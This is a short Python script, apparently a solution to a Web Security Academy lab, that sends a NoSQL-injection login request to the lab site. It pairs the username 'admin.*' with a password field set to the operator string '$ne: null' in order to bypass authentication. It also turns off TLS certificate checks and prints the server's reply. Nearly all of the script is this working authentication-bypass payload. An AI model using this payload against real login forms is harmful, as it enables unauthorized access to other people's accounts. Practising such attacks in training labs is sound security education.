#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a04008704dfb1a283dfa6f6007800eb.web-security-academy.net'

session=requests.Session()

payload = "{'$ne': null}"
data = {
    "username":"admin.*",
    "password":payload,
}

response= session.post(
    url + '/login',
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
